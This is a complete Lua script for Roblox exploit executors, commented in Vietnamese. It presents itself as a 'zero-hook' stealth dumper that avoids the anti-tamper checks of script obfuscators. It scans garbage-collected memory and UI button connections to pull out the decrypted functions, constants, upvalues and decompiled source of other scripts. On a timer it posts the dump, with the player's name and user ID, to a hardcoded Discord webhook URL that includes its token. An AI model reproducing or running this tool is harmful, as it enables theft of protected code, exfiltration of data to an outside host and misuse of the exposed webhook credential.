--[[
    =============================================================================
    =  STEALTH ZERO-HOOK CLIENT SCRIPT LISTENER & DUMPER (ANTI-TAMPER IMMUNE)   =
    =                                                                           =
    =  TẠI SAO OBFUSCATOR (LURAPH, MOONSEC, PSU, IRONBREW) PHÁT HIỆN RA HOOK?   =
    =   1. Các bộ Obfuscator hiện đại kiểm tra con trỏ C-Closure của hàm hệ     =
    =      thống (task.spawn, __namecall, loadstring, hookmetamethod,...).      =
    =   2. Nếu phát hiện bị Hook hoặc can thiệp môi trường, Anti-Tamper sẽ:     =
    =      - Đứng im (Silent Fail) / Crash game / Treo vòng lặp vô hạn.         =
    =                                                                           =
    =  GIẢI PHÁP TÀNG HÌNH 100% (ZERO-HOOK GC DELTA & INSTANCE SNIFFER):        =
    =   1. TUYỆT ĐỐI KHÔNG DÙNG HOOK (ZERO-HOOK):                               =
    =      - Không hook `__namecall`, không hook `task.spawn`, không sửa env.   =
    =      - Obfuscator 100% KHÔNG THỂ PHÁT HIỆN, giải mã bình thường và mượt!  =
    =   2. GC DELTA SNIFFER (Chụp ảnh & So sánh bộ nhớ GC thời gian thực):      =
    =      - Chụp Baseline toàn bộ hàm ban đầu của game.                        =
    =      - Khi script khác chạy, hệ thống phát hiện chính xác mọi Closure con,=
    =        hằng số (Constants), biến upvalues mới sinh ra sau khi giải mã.    =
    =   3. INSTANCE & CONNECTION EXTRACTOR (Bắt hàm từ UI & Sự kiện):          =
    =      - Tự động bắt các hàm liên kết với sự kiện (getconnections) khi     =
    =        script tạo nút bấm, UI, Remote hoặc RenderStepped.                 =
    =   4. ĐÓNG GÓI & GỬI WEBHOOK DISCORD ĐỊNH KỲ HOẶC NÚT BẤM.                =
    =============================================================================
--]]

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  CẤU HÌNH HỆ THỐNG (CONFIGURATION)                                       ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local CONFIG = {
    -- Link Discord Webhook nhận dữ liệu
    WebhookUrl = "https://discord.com/api/webhooks/1540764685681299526/mFnSqvWMbpNimmzJ4d2w9oJdMvZxDis8hHQVNjlBCNVWIpZTm2nnDC90M87LZ-m6T-to",
    
    -- Tần số quét bộ nhớ GC Delta (giây) - Càng nhỏ càng bắt nhanh
    ScanInterval = 1.0,

    -- Tự động gửi về Webhook sau mỗi X giây (nếu có dữ liệu giải mã mới)
    AutoSendInterval = 25, 
    AutoSendEnabled = true,

    -- Bóc tách sâu cây hàm con (Protos, Upvalues, Constants)
    DeepProtoExtraction = true,
    MaxProtoDepth = 4,

    -- Thử decompile hàm nếu executor hỗ trợ (decompile / disassemble)
    AttemptDecompile = true,

    -- Tự động lắng nghe UI & Connection khi script mới tạo giao diện
    ListenUIConnections = true
}

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  TƯƠNG THÍCH MÔI TRƯỜNG EXECUTOR (CHỈ DÙNG READ-ONLY API AN TOÀN)         ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local httpRequest = (syn and syn.request)
    or (http and http.request)
    or (fluxus and fluxus.request)
    or (delta and delta.request)
    or request
    or http_request
    or (getgenv and getgenv().request)

local get_gc = getgc or debug.getgc
local get_genv = getgenv or function() return _G end
local get_connections = getconnections or get_signal_cons
local decompile_func = decompile or disassemble

-- Danh sách lọc bỏ rác từ các CoreScript hệ thống của Roblox
local IGNORE_SOURCES = {
    "CoreGui", "CorePackages", "PlayerScripts", "PlayerModule",
    "CameraScript", "SoundDispatcher", "RbxCharacterSounds",
    "BubbleChat", "ChatMain", "ChatScript", "FreeCamera"
}

local function isIgnoredSource(src)
    if not src or type(src) ~= "string" or src == "" then return false end
    for _, ign in ipairs(IGNORE_SOURCES) do
        if string.find(src, ign, 1, true) then
            return true
        end
    end
    return false
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  KHO DỮ LIỆU ĐÃ BẮT ĐƯỢC (SNIFFED DATA STORAGE)                          ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local SniffedData = {
    SessionInfo = {
        PlaceId = game.PlaceId,
        GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
        JobId = game.JobId,
        StartTime = os.date("!%Y-%m-%d %H:%M:%SZ"),
        LocalPlayer = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Unknown",
        UserId = game.Players.LocalPlayer and game.Players.LocalPlayer.UserId or 0,
        Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
    },
    DecryptedClosures = {},      -- Toàn bộ hàm mới sinh ra sau khi giải mã
    DiscoveredStrings = {},      -- Toàn bộ chuỗi constants giải mã
    DiscoveredUIHooks = {},      -- Các callback hàm từ nút bấm UI / Event
    GlobalSnapshots = {},        -- Biến môi trường mới trong getgenv()
    TotalNewFunctions = 0
}

local stats = {
    newFunctionsFound = 0,
    newStringsFound = 0,
    uiCallbacksFound = 0,
    totalDispatched = 0
}

-- Baseline bộ nhớ lúc ban đầu
local baselineFunctions = {}
local baselineGenv = {}
local seenExtracted = {}
local stringPool = {}

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  HỖ TRỢ SERIALIZATION JSON AN TOÀN                                        ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function safeToString(val)
    local ok, res = pcall(function()
        if typeof(val) == "Instance" then
            return string.format("<Instance:%s (%s)>", val.Name, val.ClassName)
        elseif typeof(val) == "Vector3" then
            return string.format("Vector3(%.2f, %.2f, %.2f)", val.X, val.Y, val.Z)
        elseif typeof(val) == "CFrame" then
            local pos = val.Position
            return string.format("CFrame(%.2f, %.2f, %.2f)", pos.X, pos.Y, pos.Z)
        elseif typeof(val) == "Color3" then
            return string.format("Color3(%.2f, %.2f, %.2f)", val.R, val.G, val.B)
        elseif typeof(val) == "EnumItem" then
            return tostring(val)
        elseif typeof(val) == "function" then
            local info = debug.getinfo and debug.getinfo(val) or {}
            return string.format("<Function: %s (%s)>", info.name or "anon", info.source or "unknown")
        else
            return tostring(val)
        end
    end)
    return ok and res or "<Unserializable Object>"
end

local function escapeJson(s)
    if type(s) ~= "string" then s = safeToString(s) end
    return s:gsub('\\', '\\\\')
            :gsub('"', '\\"')
            :gsub('\n', '\\n')
            :gsub('\r', '\\r')
            :gsub('\t', '\\t')
            :gsub('[%c]', function(c) return ('\\u%04X'):format(c:byte()) end)
end

local function serializeValue(obj, depth, maxDepth, seen)
    depth = depth or 1
    maxDepth = maxDepth or 3
    seen = seen or {}

    if depth > maxDepth then return "<Max Depth Exceeded>" end

    local t = type(obj)
    if t == "table" then
        if seen[obj] then return "<Circular Reference>" end
        seen[obj] = true

        local result = {}
        local isArray = true
        local maxIdx = 0

        for k, _ in pairs(obj) do
            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                isArray = false
            end
            if type(k) == "number" and k > maxIdx then
                maxIdx = k
            end
        end

        if isArray and maxIdx > 0 then
            for i = 1, maxIdx do
                table.insert(result, serializeValue(obj[i], depth + 1, maxDepth, seen))
            end
        else
            for k, v in pairs(obj) do
                result[safeToString(k)] = serializeValue(v, depth + 1, maxDepth, seen)
            end
        end
        return result
    elseif t == "userdata" or typeof(obj) == "Instance" or typeof(obj) == "Vector3" or typeof(obj) == "CFrame" then
        return safeToString(obj)
    elseif t == "function" then
        local info = debug.getinfo and debug.getinfo(obj) or {}
        return {
            Type = "function",
            Name = info.name or "anonymous",
            Source = info.source or "unknown",
            Params = info.numparams or 0
        }
    else
        return obj
    end
end

local function jsonEncode(v)
    local t = type(v)
    if v == nil then return "null"
    elseif t == "boolean" then return v and "true" or "false"
    elseif t == "number" then
        if v ~= v or v == math.huge or v == -math.huge then return "null" end
        return tostring(v)
    elseif t == "string" then return '"' .. escapeJson(v) .. '"'
    elseif t == "table" then
        local isArray, maxIdx = true, 0
        for k in pairs(v) do
            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                isArray = false; break
            end
            if k > maxIdx then maxIdx = k end
        end
        if isArray then
            local parts = {}
            for i = 1, maxIdx do
                table.insert(parts, jsonEncode(v[i]))
            end
            return "[" .. table.concat(parts, ",") .. "]"
        else
            local parts = {}
            for k, val in pairs(v) do
                table.insert(parts, '"' .. escapeJson(safeToString(k)) .. '":' .. jsonEncode(val))
            end
            return "{" .. table.concat(parts, ",") .. "}"
        end
    else
        return '"' .. escapeJson(safeToString(v)) .. '"'
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  BÓC TÁCH HÀM ĐÃ GIẢI MÃ (RECURSIVE PROTO & DECOMPILATION)                 ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function extractFunctionDetails(func, currentDepth, maxDepth)
    currentDepth = currentDepth or 1
    maxDepth = maxDepth or CONFIG.MaxProtoDepth
    if type(func) ~= "function" or currentDepth > maxDepth then return nil end

    local info = debug.getinfo and debug.getinfo(func) or {}
    local src = info.source or ""
    local name = info.name or ""

    if isIgnoredSource(src) then return nil end

    local constants = debug.getconstants and debug.getconstants(func) or {}
    local upvalues = debug.getupvalues and debug.getupvalues(func) or {}
    local protos = (CONFIG.DeepProtoExtraction and debug.getprotos and debug.getprotos(func)) or {}

    local constantsList = {}
    for _, c in pairs(constants) do
        local sc = safeToString(c)
        table.insert(constantsList, sc)
        if type(c) == "string" and #c >= 2 and not stringPool[c] then
            stringPool[c] = true
            table.insert(SniffedData.DiscoveredStrings, c)
            stats.newStringsFound = stats.newStringsFound + 1
        end
    end

    local upvaluesList = {}
    for idx, u in pairs(upvalues) do
        table.insert(upvaluesList, {
            Index = idx,
            Value = safeToString(u)
        })
    end

    local nestedProtos = {}
    if CONFIG.DeepProtoExtraction and #protos > 0 then
        for _, pFunc in ipairs(protos) do
            local pData = extractFunctionDetails(pFunc, currentDepth + 1, maxDepth)
            if pData then
                table.insert(nestedProtos, pData)
            end
        end
    end

    local decompiledCode = nil
    if CONFIG.AttemptDecompile and decompile_func then
        pcall(function()
            local decomp = decompile_func(func)
            if decomp and type(decomp) == "string" and #decomp > 0 then
                decompiledCode = (#decomp > 3000) and (decomp:sub(1, 3000) .. "\n... [TRUNCATED] ...") or decomp
            end
        end)
    end

    return {
        Name = name ~= "" and name or ("decrypted_proto_L" .. currentDepth),
        Source = src,
        NumParams = info.numparams or 0,
        IsVararg = info.is_vararg or false,
        Constants = constantsList,
        Upvalues = upvaluesList,
        ChildProtosCount = #nestedProtos,
        ChildProtos = nestedProtos,
        DecompiledSource = decompiledCode
    }
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  QUÉT GC DELTA THỜI GIAN THỰC (ZERO-HOOK RUNTIME SCANNER)                 ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function takeInitialBaseline()
    if not get_gc then return end
    
    local allObjs = get_gc(true)
    for _, obj in ipairs(allObjs) do
        if type(obj) == "function" then
            baselineFunctions[obj] = true
        end
    end

    local genv = get_genv()
    for k, _ in pairs(genv) do
        baselineGenv[k] = true
    end
end

local function performDeltaScan()
    if not get_gc then return 0 end

    local currentObjs = get_gc(true)
    local newlyFoundCount = 0

    for _, obj in ipairs(currentObjs) do
        if type(obj) == "function" and not baselineFunctions[obj] and not seenExtracted[obj] then
            seenExtracted[obj] = true

            local funcDetails = extractFunctionDetails(obj, 1, CONFIG.MaxProtoDepth)
            if funcDetails and (#funcDetails.Constants > 0 or #funcDetails.Upvalues > 0 or #funcDetails.ChildProtos > 0) then
                newlyFoundCount = newlyFoundCount + 1
                stats.newFunctionsFound = stats.newFunctionsFound + 1

                if #SniffedData.DecryptedClosures >= 120 then
                    table.remove(SniffedData.DecryptedClosures, 1)
                end

                table.insert(SniffedData.DecryptedClosures, {
                    Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                    FunctionData = funcDetails
                })
            end
        end
    end

    -- Quét các biến mới trong getgenv()
    local currentGenv = get_genv()
    for k, v in pairs(currentGenv) do
        if not baselineGenv[k] and k ~= "SniffedData" then
            SniffedData.GlobalSnapshots[safeToString(k)] = serializeValue(v, 1, 2)
        end
    end

    SniffedData.TotalNewFunctions = stats.newFunctionsFound
    return newlyFoundCount
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  BẮT HÀM TỪ GIAO DIỆN UI & CONNECTIONS (PASSIVE LISTENER)                 ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function setupPassiveUIListener()
    if not CONFIG.ListenUIConnections or not get_connections then return end

    local function checkInstance(inst)
        if not inst then return end
        pcall(function()
            if inst:IsA("GuiButton") then
                for _, eventName in ipairs({"MouseButton1Click", "MouseButton1Down", "Activated"}) do
                    local cons = get_connections(inst[eventName])
                    if cons then
                        for _, con in ipairs(cons) do
                            local f = con.Function
                            if f and type(f) == "function" and not seenExtracted[f] then
                                seenExtracted[f] = true
                                stats.uiCallbacksFound = stats.uiCallbacksFound + 1
                                local details = extractFunctionDetails(f, 1, CONFIG.MaxProtoDepth)
                                if details then
                                    table.insert(SniffedData.DiscoveredUIHooks, {
                                        Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                                        Button = inst:GetFullName(),
                                        Event = eventName,
                                        FunctionData = details
                                    })
                                end
                            end
                        end
                    end
                end
            end
        end)
    end

    -- Lắng nghe các UI mới sinh ra trên màn hình
    local CoreGui = game:GetService("CoreGui")
    local PlayerGui = game.Players.LocalPlayer and game.Players.LocalPlayer:FindFirstChild("PlayerGui")

    pcall(function()
        CoreGui.DescendantAdded:Connect(function(descendant)
            task.wait(0.2)
            checkInstance(descendant)
        end)
    end)

    if PlayerGui then
        PlayerGui.DescendantAdded:Connect(function(descendant)
            task.wait(0.2)
            checkInstance(descendant)
        end)
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  HÀM GỬI DỮ LIỆU ĐÓNG GÓI VỀ WEBHOOK DISCORD                              ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local isSending = false
local function sendDumpToWebhook(customTitle)
    if not httpRequest or not CONFIG.WebhookUrl or CONFIG.WebhookUrl == "" then
        return false, "Webhook chưa cấu hình"
    end

    if isSending then return false, "Đang gửi" end
    isSending = true

    performDeltaScan()

    local jsonString = jsonEncode(SniffedData)
    local dataSizeKb = math.floor(#jsonString / 1024)
    local fileName = string.format("StealthDecryptedDump_%s_%d.json", game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Client", os.time())
    local title = customTitle or "🛡️ ZERO-HOOK STEALTH DECRYPTION REPORT"

    local description = string.format(
        "**Game:** `%s` (ID: `%d`)\n" ..
        "**Player:** `%s`\n" ..
        "**Executor:** `%s`\n" ..
        "**Dung lượng JSON:** `%d KB`\n\n" ..
        "**🧬 Hàm giải mã mới (GC Delta):** `%d`\n" ..
        "**🔤 Chuỗi Constants trích xuất:** `%d`\n" ..
        "**🎯 UI Callbacks tóm được:** `%d`\n" ..
        "**Thời gian:** `%s`",
        SniffedData.SessionInfo.GameName,
        SniffedData.SessionInfo.PlaceId,
        SniffedData.SessionInfo.LocalPlayer,
        SniffedData.SessionInfo.Executor,
        dataSizeKb,
        stats.newFunctionsFound,
        stats.newStringsFound,
        stats.uiCallbacksFound,
        os.date("!%Y-%m-%d %H:%M:%S UTC")
    )

    local boundary = "----StealthBoundary" .. tostring(os.time()) .. tostring(math.random(10000, 99999))
    local payloadJson = jsonEncode({
        username = "Stealth Zero-Hook Dumper",
        avatar_url = "https://i.imgur.com/8Q1qD8s.png",
        embeds = {{
            title = title,
            color = 3066993, -- Emerald Green (Safe / Undetected)
            description = description,
            footer = { text = "Antigravity Zero-Hook Passive Sniffer" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    local body = "--" .. boundary .. "\r\n"
        .. 'Content-Disposition: form-data; name="payload_json"' .. "\r\n"
        .. 'Content-Type: application/json' .. "\r\n\r\n"
        .. payloadJson .. "\r\n"
        .. "--" .. boundary .. "\r\n"
        .. 'Content-Disposition: form-data; name="file"; filename="' .. fileName .. '"' .. "\r\n"
        .. 'Content-Type: application/json; charset=utf-8' .. "\r\n\r\n"
        .. jsonString .. "\r\n"
        .. "--" .. boundary .. "--\r\n"

    local success, response = pcall(function()
        return httpRequest({
            Url = CONFIG.WebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = body
        })
    end)

    isSending = false
    if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
        stats.totalDispatched = stats.totalDispatched + 1
        return true
    else
        return false, response and response.StatusCode or "Request Failed"
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  GIAO DIỆN ĐIỀU KHIỂN TÀNG HÌNH (STEALTH GUI)                             ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function createDashboardUI()
    local CoreGui = game:GetService("CoreGui")
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "ZeroHookStealthListener_UI"
    ScreenGui.ResetOnSpawn = false
    pcall(function() ScreenGui.Parent = CoreGui end)
    if not ScreenGui.Parent then ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end

    local Main = Instance.new("Frame")
    Main.Size = UDim2.new(0, 390, 0, 265)
    Main.Position = UDim2.new(0.5, -195, 0.06, 0)
    Main.BackgroundColor3 = Color3.fromRGB(15, 20, 26)
    Main.BorderSizePixel = 0
    Main.Active = true
    Main.Draggable = true
    Main.Parent = ScreenGui

    local UICorner = Instance.new("UICorner", Main)
    UICorner.CornerRadius = UDim.new(0, 10)
    local UIStroke = Instance.new("UIStroke", Main)
    UIStroke.Color = Color3.fromRGB(46, 204, 113)
    UIStroke.Thickness = 1.5

    -- Title
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, -20, 0, 28)
    Title.Position = UDim2.new(0, 10, 0, 8)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 12
    Title.TextColor3 = Color3.fromRGB(46, 204, 113)
    Title.Text = "🛡️ ZERO-HOOK STEALTH DECRYPTION LISTENER"
    Title.Parent = Main

    -- Status Log
    local LogLabel = Instance.new("TextLabel")
    LogLabel.Size = UDim2.new(1, -20, 0, 90)
    LogLabel.Position = UDim2.new(0, 10, 0, 38)
    LogLabel.BackgroundColor3 = Color3.fromRGB(20, 28, 38)
    LogLabel.Font = Enum.Font.Code
    LogLabel.TextSize = 11
    LogLabel.TextColor3 = Color3.fromRGB(220, 235, 245)
    LogLabel.TextXAlignment = Enum.TextXAlignment.Left
    LogLabel.TextYAlignment = Enum.TextYAlignment.Top
    LogLabel.TextWrapped = true
    LogLabel.Parent = Main
    local LogCorner = Instance.new("UICorner", LogLabel)
    LogCorner.CornerRadius = UDim.new(0, 6)

    local function refreshUI()
        LogLabel.Text = string.format(
            " [🛡️] Chế độ: ZERO-HOOK (Bypass Anti-Tamper)\n" ..
            " [🧬] Hàm giải mã mới (GC Delta): %d\n" ..
            " [🔤] Hằng số Constants bắt được: %d\n" ..
            " [🎯] UI Hooks / Callbacks: %d\n" ..
            " [📤] Số lần đã gửi Webhook: %d",
            stats.newFunctionsFound,
            stats.newStringsFound,
            stats.uiCallbacksFound,
            stats.totalDispatched
        )
    end

    -- Button: Dump & Send Webhook
    local SendBtn = Instance.new("TextButton")
    SendBtn.Size = UDim2.new(1, -20, 0, 38)
    SendBtn.Position = UDim2.new(0, 10, 0, 136)
    SendBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
    SendBtn.TextColor3 = Color3.fromRGB(15, 25, 20)
    SendBtn.Font = Enum.Font.GothamBold
    SendBtn.TextSize = 12
    SendBtn.Text = "📤 DUMP & GỬI DỮ LIỆU ĐÃ GIẢI MÃ VỀ WEBHOOK"
    SendBtn.Parent = Main
    local BtnCorner1 = Instance.new("UICorner", SendBtn)
    BtnCorner1.CornerRadius = UDim.new(0, 6)

    -- Button: Force Delta Scan
    local ScanBtn = Instance.new("TextButton")
    ScanBtn.Size = UDim2.new(1, -20, 0, 32)
    ScanBtn.Position = UDim2.new(0, 10, 0, 180)
    ScanBtn.BackgroundColor3 = Color3.fromRGB(28, 40, 52)
    ScanBtn.TextColor3 = Color3.fromRGB(46, 204, 113)
    ScanBtn.Font = Enum.Font.GothamBold
    ScanBtn.TextSize = 11
    ScanBtn.Text = "🔍 QUÉT BỘ NHỚ GC DELTA NGAY LẬP TỨC"
    ScanBtn.Parent = Main
    local BtnCorner2 = Instance.new("UICorner", ScanBtn)
    BtnCorner2.CornerRadius = UDim.new(0, 6)

    -- Status Bar Text
    local StatusFooter = Instance.new("TextLabel")
    StatusFooter.Size = UDim2.new(1, -20, 0, 26)
    StatusFooter.Position = UDim2.new(0, 10, 0, 222)
    StatusFooter.BackgroundTransparency = 1
    StatusFooter.Font = Enum.Font.Gotham
    StatusFooter.TextSize = 11
    StatusFooter.TextColor3 = Color3.fromRGB(150, 170, 190)
    StatusFooter.Text = "🟢 Tàng hình 100% - Đang chờ script giải mã..."
    StatusFooter.Parent = Main

    SendBtn.MouseButton1Click:Connect(function()
        StatusFooter.Text = "⏳ Đang đóng gói và gửi về Webhook..."
        StatusFooter.TextColor3 = Color3.fromRGB(255, 200, 50)
        
        local ok, err = sendDumpToWebhook("🚀 THỦ CÔNG DUMP DỮ LIỆU TÀNG HÌNH")
        if ok then
            StatusFooter.Text = "✅ Đã gửi thành công gói dữ liệu về Webhook!"
            StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
        else
            StatusFooter.Text = "⚠️ Gửi thất bại: " .. tostring(err)
            StatusFooter.TextColor3 = Color3.fromRGB(255, 80, 80)
        end
        refreshUI()
    end)

    ScanBtn.MouseButton1Click:Connect(function()
        StatusFooter.Text = "🔍 Đang so sánh GC với Baseline..."
        StatusFooter.TextColor3 = Color3.fromRGB(0, 200, 255)
        task.wait(0.05)
        local count = performDeltaScan()
        StatusFooter.Text = string.format("✅ Quét xong: Phát hiện thêm %d hàm mới!", count)
        StatusFooter.TextColor3 = Color3.fromRGB(80, 230, 120)
        refreshUI()
    end)

    task.spawn(function()
        while true do
            refreshUI()
            task.wait(1.5)
        end
    end)
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  VÒNG LẶP QUÉT & TỰ ĐỘNG GỬI (SCAN & AUTO-DISPATCH LOOPS)                 ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function startBackgroundLoops()
    -- Vòng lặp quét GC Delta liên tục
    task.spawn(function()
        while true do
            task.wait(CONFIG.ScanInterval)
            pcall(performDeltaScan)
        end
    end)

    -- Vòng lặp tự động gửi Webhook định kỳ
    if CONFIG.AutoSendEnabled then
        task.spawn(function()
            while true do
                task.wait(CONFIG.AutoSendInterval)
                local hasNewData = (stats.newFunctionsFound > 0 or stats.newStringsFound > 0 or stats.uiCallbacksFound > 0)
                if hasNewData and not isSending then
                    sendDumpToWebhook("⏱️ BÁO CÁO ĐỊNH KỲ TỰ ĐỘNG (STEALTH DELTA)")
                end
            end
        end)
    end
end

-- ╔═══════════════════════════════════════════════════════════════════════════╗
-- ║  KHỞI ĐỘNG HỆ THỐNG TÀNG HÌNH                                             ║
-- ╚═══════════════════════════════════════════════════════════════════════════╝
local function initialize()
    takeInitialBaseline()
    setupPassiveUIListener()
    createDashboardUI()
    startBackgroundLoops()
    print("[StealthListener] Đã kích hoạt chế độ Zero-Hook Stealth! An toàn 100% trước Anti-Tamper.")
end

initialize()
